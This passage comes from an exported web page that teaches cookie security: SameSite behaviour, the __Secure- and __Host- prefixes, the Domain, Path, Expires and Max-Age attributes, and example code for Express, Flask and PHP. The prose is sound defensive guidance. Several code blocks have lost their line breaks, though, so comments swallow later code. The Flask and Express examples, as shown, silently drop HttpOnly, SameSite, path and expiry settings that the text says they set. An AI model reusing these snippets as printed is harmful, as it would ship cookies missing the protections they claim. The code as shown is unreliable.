But cookie IS sent when user clicks link (GET navigation)</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80c6-b998-eee6a00091ed" class="numbered-list" start="3"><li><strong>None Mode:</strong><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80f4-af69-d218a59bd03e" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Cookie IS sent - no CSRF protection
Must use additional CSRF tokens</code></pre></div></li></ol></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8038-a1f3-ce8c37dae520"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-8001-8b97-c345172d3a3a" class="">Cookie Prefixes</h2></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8002-93fc-f2d39cba1645" class="">Cookie prefixes (<code>__Secure-</code> and <code>__Host-</code>) provide additional security by enforcing constraints at the browser level.</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8067-b44d-e263d1528688" class="">__Secure- Prefix</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8058-8f49-fd6b50366024" class=""><strong>Requirements:</strong><br/>- Cookie name must start with <code>__Secure-</code><br/>- Must have <code>Secure</code> attribute<br/>- Must be set from secure (HTTPS) origin</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-809f-baf6-d5f7ef36f871" class=""><strong>Purpose:</strong><br/>- Prevents accidental insecure cookie setting<br/>- Enforces secure transmission</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8028-a20e-f0125de6f710" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-800b-81a8-edc9c586919f" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">// ✅ Valid
Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly

// ❌ Invalid - missing Secure
Set-Cookie: __Secure-sessionId=abc123; HttpOnly
// Browser will reject this cookie

// ❌ Invalid - set from HTTP
// Browser will reject if set from non-HTTPS origin</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8069-b9c0-d2c66af4c428" class=""><strong>Use Case:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8083-aced-d990bb2ceffd" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Server coderes.cookie(&#x27;__Secure-sessionId&#x27;, sessionToken, {
  secure: true,  httpOnly: true,  sameSite: &#x27;Strict&#x27;});</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80a3-926d-cabfeaea6ffb" class="">__Host- Prefix</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-803c-9c3b-f7558bdb746b" class=""><strong>Requirements:</strong><br/>- Cookie name must start with <code>__Host-</code><br/>- Must have <code>Secure</code> attribute<br/>- Must have <code>Path=/</code><br/>- Must NOT have <code>Domain</code> attribute<br/>- Must be set from secure (HTTPS) origin</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-808a-8827-e6dad595997e" class=""><strong>Purpose:</strong><br/>- Prevents subdomain cookie access<br/>- Prevents path-based cookie scope issues<br/>- Maximum isolation</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-809d-b3a6-df02919453ea" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80f3-835a-ff85904fecbf" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">// ✅ Valid
Set-Cookie: __Host-sessionId=abc123; Secure; Path=/; HttpOnly

// ❌ Invalid - has Domain attribute
Set-Cookie: __Host-sessionId=abc123; Secure; Path=/; Domain=example.com
// Browser will reject

// ❌ Invalid - Path is not /
Set-Cookie: __Host-sessionId=abc123; Secure; Path=/api; HttpOnly
// Browser will reject</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80e8-972b-e1a5ec27fc4f" class=""><strong>Use Case:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8001-8ae5-f596835e1068" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Prevents cookie from being accessible to subdomains// example.com sets: __Host-sessionId=abc123// subdomain.example.com CANNOT access this cookie</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8089-b21d-f2c14dd87b7b" class=""><strong>Security Benefits:</strong><br/>- Prevents subdomain takeover attacks<br/>- Prevents cookie scope confusion<br/>- Ensures cookie is only for the exact host</p></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8018-9949-eeb7eb099e8f"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-80d9-bd49-ca2d26ec00f7" class="">Other Cookie Attributes</h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8063-bfd7-dfc6998ff50e" class="">Domain Attribute</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80c3-ac24-fff01ff93107" class=""><strong>Purpose:</strong><br/>Controls which domains can receive the cookie.</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8048-b9bd-f635cd7588cd" class=""><strong>Syntax:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80b6-a48e-efd6343750c4" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; Domain=example.com</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80a0-8050-c67bd1e055a7" class=""><strong>Behavior:</strong><br/>- If <code>Domain</code> is set to <code>example.com</code>, cookie is sent to:<br/>- <code>example.com</code><br/>- <code>www.example.com</code><br/>- <code>api.example.com</code><br/>- Any subdomain of <code>example.com</code></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80e2-89b6-f65150f0e7e9" class="bulleted-list"><li style="list-style-type:disc">If <code>Domain</code> is NOT set, cookie is sent only to:<div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8003-9216-cfcf25861d8f" class="bulleted-list"><li style="list-style-type:circle">The exact host that set it</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80e1-88a8-d598c9bd2302" class="bulleted-list"><li style="list-style-type:circle">Not to subdomains</li></ul></div></li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-808b-a7d5-cc6def2f84a6" class=""><strong>Security Considerations:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8007-b35a-e600b81fb873" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">// ⚠️ Risky - too broad
Set-Cookie: sessionId=abc123; Domain=.example.com
// Accessible to all subdomains, including compromised ones

// ✅ Better - no Domain attribute
Set-Cookie: sessionId=abc123
// Only accessible to exact host

// ✅ Best - use __Host- prefix
Set-Cookie: __Host-sessionId=abc123; Secure; Path=/
// Cannot set Domain, maximum security</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8051-9ce3-c7bbb4cb3058" class="">Path Attribute</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8050-aa11-f21de319e7aa" class=""><strong>Purpose:</strong><br/>Controls which URL paths can access the cookie.</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8064-b5d2-ecca6932da1c" class=""><strong>Syntax:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80f8-b2ea-ca2caefb24b4" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; Path=/api</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80fd-ac79-e3598a65b30e" class=""><strong>Behavior:</strong><br/>- Cookie is sent only for requests to paths matching the specified path<br/>- Path matching is prefix-based</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8042-8b33-dd3596dee6e8" class=""><strong>Examples:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8009-b88f-d95a5f4f5303" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; Path=/

// Sent with:
// ✅ https://example.com/
// ✅ https://example.com/dashboard
// ✅ https://example.com/api/users

Set-Cookie: sessionId=abc123; Path=/api

// Sent with:
// ✅ https://example.com/api/users
// ✅ https://example.com/api/auth/login
// ❌ https://example.com/dashboard
// ❌ https://example.com/</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80c0-9b85-e120f8066474" class=""><strong>Security Considerations:</strong><br/>- Use most restrictive path possible<br/>- Default is the path of the document setting the cookie<br/>- For session cookies, typically use <code>Path=/</code></p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-807d-bdb6-fb997e836f37" class="">Expires and Max-Age Attributes</h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80bc-993d-fb1954a19848" class=""><strong>Purpose:</strong><br/>Control when the cookie expires and is deleted.</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8044-a649-d2792c214842" class=""><strong>Expires:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-801a-892b-c1591cc6284d" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2025 07:28:00 GMT</code></pre></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8052-aadc-eb3c90b29de8" class="bulleted-list"><li style="list-style-type:disc">Absolute expiration date/time</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80e5-ab39-fcf4b107139b" class="bulleted-list"><li style="list-style-type:disc">Must be in GMT format</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-803f-bbe9-fd97d593cbff" class="bulleted-list"><li style="list-style-type:disc">If not set, cookie is a “session cookie” (deleted when browser closes)</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80b5-8d07-ead68a2d58eb" class=""><strong>Max-Age:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80ed-97f4-e5b07f13710b" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; Max-Age=3600</code></pre></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-801b-8270-d09f134840be" class="bulleted-list"><li style="list-style-type:disc">Relative expiration in seconds</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-806e-83c9-cde3bfc1286c" class="bulleted-list"><li style="list-style-type:disc">More convenient than <code>Expires</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8025-b957-e1997b372518" class="bulleted-list"><li style="list-style-type:disc">If both are set, <code>Max-Age</code> takes precedence</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-807a-be64-e20db73f62f9" class=""><strong>Security Best Practices:</strong><br/>- Set short expiration times for sensitive cookies<br/>- Use session cookies (no expiration) for temporary data<br/>- Implement server-side session expiration<br/>- Rotate session tokens periodically</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8049-af3f-edb32cec2a58" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-808c-a677-e1a67e2413da" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Session cookie (deleted when browser closes)Set-Cookie: sessionId=abc123; HttpOnly; Secure
// Persistent cookie (expires in 1 hour)Set-Cookie: sessionId=abc123; HttpOnly; Secure; Max-Age=3600// Persistent cookie (expires on specific date)Set-Cookie: rememberMe=yes; HttpOnly; Secure; Expires=Wed, 21 Oct 2025 07:28:00 GMT</code></pre></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-80f3-b1d7-d4218b5e17ce"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-80d5-93b0-d9158ae9a671" class="">Complete Cookie Security Implementation</h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80b7-bd14-d8fe79af5882" class="">Recommended Configuration for Session Cookies</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8085-8106-d418748bfa6c" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8028-b8fc-e90791a6de94" class=""><strong>Why this configuration:</strong><br/>- <code>__Host-</code> prefix: Prevents subdomain access<br/>- <code>Secure</code>: Only over HTTPS<br/>- <code>HttpOnly</code>: No JavaScript access (XSS protection)<br/>- <code>SameSite=Strict</code>: Maximum CSRF protection<br/>- <code>Path=/</code>: Available site-wide<br/>- <code>Max-Age=3600</code>: Expires in 1 hour</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-805f-8467-c94c298adcf3" class="">Recommended Configuration for Authentication Cookies</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8090-a992-e20400984d69" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Secure-authToken=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=86400</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-804c-8fb8-d760ad1e57ab" class=""><strong>Why this configuration:</strong><br/>- <code>__Secure-</code> prefix: Enforces secure transmission<br/>- <code>Secure</code>: Only over HTTPS<br/>- <code>HttpOnly</code>: No JavaScript access (XSS protection)<br/>- <code>SameSite=Lax</code>: Balance of CSRF protection and usability<br/>- <code>Path=/</code>: Available site-wide<br/>- <code>Max-Age=86400</code>: Expires in 24 hours</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80d4-b772-db936e1a6d36" class="">Recommended Configuration for Third-Party Cookies</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8083-8e41-e9afd3e5e1e2" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Secure-widgetSession=def456; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8091-94eb-de2b0876a495" class=""><strong>Why this configuration:</strong><br/>- <code>__Secure-</code> prefix: Enforces secure transmission<br/>- <code>Secure</code>: Required for <code>SameSite=None</code><br/>- <code>HttpOnly</code>: No JavaScript access (XSS protection)<br/>- <code>SameSite=None</code>: Allows cross-site requests (no CSRF protection, use tokens)<br/>- <code>Path=/</code>: Available site-wide<br/>- <code>Max-Age=1800</code>: Expires in 30 minutes</p></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8092-b210-f2f44568fa69" class="">Implementation Examples</h3></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-801a-96cb-f79bb346d207" class="">Node.js (Express)</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8059-a46c-fb2aa3409165" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const express = require(&#x27;express&#x27;);const cookieParser = require(&#x27;cookie-parser&#x27;);const app = express();app.use(cookieParser());// Set secure session cookieapp.post(&#x27;/login&#x27;, (req, res) =&gt; {
  const sessionToken = generateSessionToken();  res.cookie(&#x27;__Host-sessionId&#x27;, sessionToken, {
    secure: true,           // HTTPS only    httpOnly: true,         // No JavaScript access (XSS protection)    sameSite: &#x27;strict&#x27;,     // CSRF protection    path: &#x27;/&#x27;,              // Site-wide    maxAge: 3600000,        // 1 hour    // Note: __Host- prefix requires no domain attribute  });  res.json({ success: true });});</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8083-9873-f5caa82962d9" class="">Python (Flask)</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80be-921d-f535dc642358" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from flask import Flask, make_response, request
from datetime import datetime, timedelta
app = Flask(__name__)
@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])
def login():
    session_token = generate_session_token()
    response = make_response({&#x27;success&#x27;: True})
    response.set_cookie(
        &#x27;__Host-sessionId&#x27;,
        value=session_token,
        secure=True,           # HTTPS only        httponly=True,         # No JavaScript access (XSS protection)        samesite=&#x27;Strict&#x27;,     # CSRF protection        path=&#x27;/&#x27;,              # Site-wide        max_age=3600,          # 1 hour        # Note: __Host- prefix requires no domain parameter    )
    return response</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80b1-9d6c-e470f4ef0bc7" class="">PHP</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80d5-9033-e048c766e518" class="code code-wrap"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;?phpfunction setSecureSessionCookie($sessionId) {
    setcookie(
        &#x27;__Host-sessionId&#x27;,        $sessionId,        [
            &#x27;expires&#x27; =&gt; time() + 3600,  // 1 hour            &#x27;path&#x27; =&gt; &#x27;/&#x27;,            &#x27;secure&#x27; =&gt; true,            // HTTPS only            &#x27;httponly&#x27; =&gt; true,          // No JavaScript access (XSS protection)            &#x27;samesite&#x27; =&gt; &#x27;Strict&#x27;       // CSRF protection            // Note: __Host- prefix requires no domain option        ]
    );}
